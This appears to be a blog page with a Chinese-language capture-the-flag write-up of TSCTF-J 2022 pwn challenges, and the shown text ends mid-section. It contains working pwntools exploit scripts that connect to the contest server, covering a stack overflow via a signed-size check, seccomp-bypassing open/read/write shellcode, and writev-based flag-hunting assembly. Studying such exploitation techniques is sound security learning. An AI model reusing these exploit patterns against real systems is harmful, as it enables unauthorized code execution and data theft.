@@ -1,0 +1,580 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="giacomo">
+  
+    <meta name="description" content="wp_of_tsctf-j_2022感谢出题人们的耐心解答。 pwn世界 思路 前期刷分，后期用分数换技能，（当然是选择下辈子不要WAIFU辣）。注意到有read函数可以输入，且程序没开pie，并且给了goddess_backdoor函数，由此猜测栈溢出。  size_t 变量类型 read前会检查输入的大小，49不够溢出，但是nbytes的变量类型是size_t，size_t被解析位无符号数，然">
+<meta property="og:type" content="article">
+<meta property="og:title" content="giacomo">
+<meta property="og:url" content="https://91ac0m0.github.io/2022/10/13/tsctf-j/index.html">
+<meta property="og:site_name" content="giacomo">
+<meta property="og:description" content="wp_of_tsctf-j_2022感谢出题人们的耐心解答。 pwn世界 思路 前期刷分，后期用分数换技能，（当然是选择下辈子不要WAIFU辣）。注意到有read函数可以输入，且程序没开pie，并且给了goddess_backdoor函数，由此猜测栈溢出。  size_t 变量类型 read前会检查输入的大小，49不够溢出，但是nbytes的变量类型是size_t，size_t被解析位无符号数，然">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-10-13T13:36:30.207Z">
+<meta property="article:modified_time" content="2022-10-22T13:43:15.349Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="giacomo">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>giacomo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"91ac0m0.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":false,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>giacomo</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-13 21:36" pubdate>
+          2022年10月13日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="wp-of-tsctf-j-2022"><a href="#wp-of-tsctf-j-2022" class="headerlink" title="wp_of_tsctf-j_2022"></a>wp_of_tsctf-j_2022</h1><p>感谢出题人们的耐心解答。</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="世界"><a href="#世界" class="headerlink" title="世界"></a>世界</h3><ul>
+<li><p>思路</p>
+<p>前期刷分，后期用分数换技能，（当然是选择下辈子不要WAIFU辣）。注意到有read函数可以输入，且程序没开pie，并且给了goddess_backdoor函数，由此猜测栈溢出。</p>
+</li>
+<li><p>size_t 变量类型</p>
+<p>read前会检查输入的大小，49不够溢出，但是nbytes的变量类型是size_t，size_t被解析位无符号数，然而在和49比较的时候是以int格式的，即有符号数。因此输入size一个负数即可。</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> nbytes; <span class="comment">// [esp+0h] [ebp-4Ch] BYREF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Your skill length: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">49</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;ENTER YOUR SKILL: &quot;</span>);</span><br><span class="line">result = read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>exp</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">    </span><br><span class="line">    context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;x86&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    content = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">        giacomo = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        giacomo = remote(<span class="string">&quot;10.21.162.184&quot;</span>, <span class="number">6657</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">        <span class="comment"># gdb.attach(giacomo, &#x27;b* 0x8049780&#x27;)</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        backdoor = <span class="number">0x804984A</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">201</span>):</span><br><span class="line">            giacomo.recvuntil(<span class="string">b&#x27;Choice: &gt; &#x27;</span>)</span><br><span class="line">            giacomo.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">        giacomo.sendlineafter(<span class="string">b&#x27;Choice: &gt; &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">        giacomo.sendlineafter(<span class="string">b&#x27;Choice: &gt; &#x27;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">        giacomo.sendlineafter(<span class="string">b&#x27;Your skill length: \n&#x27;</span>, <span class="string">b&#x27;-49&#x27;</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4b</span> + p32(backdoor)</span><br><span class="line">        giacomo.sendafter(<span class="string">b&#x27;ENTER YOUR SKILL: \n&#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line">        giacomo.interactive()</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### checkin</span></span><br><span class="line"></span><br><span class="line">- exp</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">    </span><br><span class="line">    context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    content = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">        giacomo = process(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        giacomo = remote(<span class="string">&quot;10.21.162.184&quot;</span>, <span class="number">6661</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">        <span class="comment"># gdb.attach(giacomo)</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        giacomo.sendafter(<span class="string">b&#x27;==&gt; BBBBBBBB\n&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x21</span>+<span class="string">b&#x27;BUPTBUPT&#x27;</span>)</span><br><span class="line">        giacomo.interactive()</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><ul>
+<li><p>沙箱&amp;ORW</p>
+<p>（本来以为是普通的execve bin sh，直到报错bad syscall，才意识到被ban了。）这里使用了seccomp的沙箱机制，可以用seccomp-tools查看。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">giacomo@ubuntu:~/Desktop/tsctf-j$ seccomp-tools dump ./ret2shellcode</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x00 0x01 0x0000003b  <span class="keyword">if</span> (A != execve) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br></pre></td></tr></table></figure>
+
+<p>execve被禁用，还可以ROW绕过，读取flag文件写入栈并输出。</p>
+</li>
+<li><p>exp</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">    giacomo = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    giacomo = remote(<span class="string">&quot;10.21.162.184&quot;</span>, <span class="number">6660</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># gdb.attach(giacomo)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    readshellcode =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,0;  #标准输入</span></span><br><span class="line"><span class="string">    mov rsi,0x23301e;#地址</span></span><br><span class="line"><span class="string">    mov rdx,0x1000;#大小</span></span><br><span class="line"><span class="string">    mov rax,0;#0号也就是read调用</span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> </span><br><span class="line">    readshellcode = asm(readshellcode)</span><br><span class="line">    giacomo.sendafter(<span class="string">b&#x27;Please write your letter:\n&#x27;</span>, readshellcode)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> +p64(<span class="number">0x233000</span>)</span><br><span class="line">    giacomo.sendafter(<span class="string">b&#x27;OK,I will pass it on for you!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">    open_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push   0x67616c66</span></span><br><span class="line"><span class="string">    push   0x2</span></span><br><span class="line"><span class="string">    pop    rax</span></span><br><span class="line"><span class="string">    mov    rdi,rsp</span></span><br><span class="line"><span class="string">    xor    rsi,rsi</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    read_flag =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov    rdi,rax</span></span><br><span class="line"><span class="string">    xor    rax,rax</span></span><br><span class="line"><span class="string">    mov    rsi,rsp</span></span><br><span class="line"><span class="string">    push   0x20</span></span><br><span class="line"><span class="string">    pop    rdx</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    output_flag =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push   0x1</span></span><br><span class="line"><span class="string">    pop    rax</span></span><br><span class="line"><span class="string">    push   0x1</span></span><br><span class="line"><span class="string">    pop    rdi</span></span><br><span class="line"><span class="string">    mov    rsi,rsp</span></span><br><span class="line"><span class="string">    push   0x20</span></span><br><span class="line"><span class="string">    pop    rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    shellcode = asm(open_flag + read_flag + output_flag)</span><br><span class="line"></span><br><span class="line">    giacomo.send(shellcode)</span><br><span class="line">    giacomo.recvuntil(<span class="string">b&#x27;TSCTF&#x27;</span>)</span><br><span class="line">    flag = giacomo.recv()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h3><ul>
+<li><p>随机可爱pics是这么出现的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);   <span class="comment">//读取/dev/urandom获取随机数</span></span><br><span class="line">read(fd, &amp;buf, <span class="number">4uLL</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2333</span> * buf % a1;		<span class="comment">//		随机数模4</span></span><br></pre></td></tr></table></figure>
+
+<p>ida里看函数依次为</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">main</span><br><span class="line">rand</span><br><span class="line">binsh</span><br><span class="line">pic1</span><br><span class="line">pic2</span><br><span class="line">pic3</span><br><span class="line">pic4</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>​		输入完成后函数随机调用4个pic的其中一个，pic1和binsh地址除了后两位都是一样的，用p8()覆盖地址的后2位就有机会（1&#x2F;4）		binsh。</p>
+<ul>
+<li><p>exp</p>
+<p>忘存了呜呜</p>
+</li>
+</ul>
+<h3 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h3><ul>
+<li><p>程序大致流程</p>
+<p>  程序申请了两个0x1000的内存（不知道是什么原理，这两个内存的地址差值在同一设备上固定，但是不同设备不是。我从ubantu18换到20才发现。）前一个内存里是flag，后一个内存被写入如下数据：</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7ff6000:	0x3148f63148ff3148	0x48c93148d23148d2</span><br><span class="line">0x7ffff7ff6010:	0xc0314ddb3148c031	0x314dd2314dc9314d</span><br><span class="line">0x7ffff7ff6020:	0x48ed314de4314ddb	0x	    ed3148e431</span><br></pre></td></tr></table></figure>
+<p>  即如下汇编，用来清空寄存器。</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7ff6000    xor    rdi, rdi</span><br><span class="line">0x7ffff7ff6003    xor    rsi, rsi</span><br><span class="line">0x7ffff7ff6006    xor    rdx, rdx</span><br><span class="line">0x7ffff7ff6009    xor    rdx, rdx</span><br><span class="line">0x7ffff7ff600c    xor    rcx, rcx</span><br><span class="line">0x7ffff7ff600f    xor    rax, rax</span><br><span class="line">0x7ffff7ff6012    xor    rbx, rbx</span><br><span class="line">0x7ffff7ff6015    xor    r8, r8</span><br><span class="line">0x7ffff7ff6018    xor    r9, r9</span><br><span class="line">0x7ffff7ff601b    xor    r10, r10</span><br><span class="line">0x7ffff7ff601e    xor    r11, r11</span><br></pre></td></tr></table></figure>
+<p>  输入的位置在二进制代码之后，完成输入之后，程序跳转到第二片内存区域执行清空寄存器指令。</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, [rbp+var_8]</span><br><span class="line">call    rax</span><br></pre></td></tr></table></figure>
+<p>  总的来说就是输入一段shellcode，在清空寄存器后执行shellcode。</p>
+</li>
+<li><p>沙箱</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">giacomo@ubuntu:~/Desktop/tsctf-j$ seccomp-tools dump ./sc</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x14 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0022</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x0000003b  <span class="keyword">if</span> (A != execve) goto 0005</span><br><span class="line"> 0004: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0005: 0x15 0x00 0x01 0x00000002  <span class="keyword">if</span> (A != open) goto 0007</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000039  <span class="keyword">if</span> (A != fork) goto 0009</span><br><span class="line"> 0008: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x00000005  <span class="keyword">if</span> (A != fstat) goto 0011</span><br><span class="line"> 0010: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0011: 0x15 0x00 0x01 0x00000000  <span class="keyword">if</span> (A != <span class="built_in">read</span>) goto 0013</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0013: 0x15 0x00 0x01 0x00000001  <span class="keyword">if</span> (A != write) goto 0015</span><br><span class="line"> 0014: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0015: 0x15 0x00 0x01 0x0000000a  <span class="keyword">if</span> (A != mprotect) goto 0017</span><br><span class="line"> 0016: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0017: 0x15 0x00 0x01 0x00000025  <span class="keyword">if</span> (A != alarm) goto 0019</span><br><span class="line"> 0018: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0019: 0x15 0x00 0x01 0x00000009  <span class="keyword">if</span> (A != mmap) goto 0021</span><br><span class="line"> 0020: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0021: 0x15 0x00 0x01 0x00000101  <span class="keyword">if</span> (A != openat) goto 0023</span><br><span class="line"> 0022: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br></pre></td></tr></table></figure>
+
+<p>  不仅不能调用exevce，也禁用了read，write，open，openat。那就只能找其它的syscall来读flag了。syscall table里有一个writev，将分散的数据块写入多个连续区域，不过writev需要结构体iovec，用来表明数据块的地址和大小。所以在使用writev之前不仅要找到flag地址，还要在内存里写指针和输出的大小。</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">writev(<span class="type">int</span> fd, <span class="keyword">struct</span> iovect* iov, <span class="type">int</span> iovcnt);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> &#123;</span></span><br><span class="line">    <span class="type">void</span>* iov_base;</span><br><span class="line">    <span class="type">size_t</span> iov_len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>确定两块内存的地址</p>
+<p>虽然寄存器被清空，但是留下了一个rip。rip指令能用lea指令读取，如<code>lea rbp, [rip]</code>，这样就得到了第二片内存块的地址。</p>
+<p>在本地两篇内存块的偏移是固定的，所以至少能在本地得到前一块内存的地址。不过远程就不一样了，只好依次加0x1000找flag，刚好”TSCTF-J{“是八个字节，比较好找。（我本来想挨个把偏移试一遍，但出题人觉得不够优雅，于是提醒我不妨搜索一下）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    get_addr = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    lea rbx, [rip]</span></span><br><span class="line"><span class="string">    mov rsp, rbx</span></span><br><span class="line"><span class="string">    add rsp, 0x100</span></span><br><span class="line"><span class="string">    sub rbx, 0x34    </span></span><br><span class="line"><span class="string">    mov r14, 0x7b4a2d4654435354			#TSCTF-J&#123;</span></span><br><span class="line"><span class="string">nomatch:  </span></span><br><span class="line"><span class="string">    add rbx, 0x1000</span></span><br><span class="line"><span class="string">    mov rcx, [rbx]				</span></span><br><span class="line"><span class="string">    cmp rcx, r14						#比较内存里的值是不是TSCTF-&#123;</span></span><br><span class="line"><span class="string">    je match;							#找到了flag</span></span><br><span class="line"><span class="string">    jne nomatch;						#没找到，rbx继续加0x1000寻找</span></span><br><span class="line"><span class="string">match:</span></span><br><span class="line"><span class="string">    mov rcx, rbx</span></span><br><span class="line"><span class="string">    mov r10, rbx</span></span><br><span class="line"><span class="string">    add r10, 0x40</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构造iovec结构体</p>
+<p>使用mov指令将数据写入指定内存块即可。（这里想了超级超级久hhh甚至找了奇奇怪怪的syscall，败在不熟悉汇编语言了，前面的lea也是）</p>
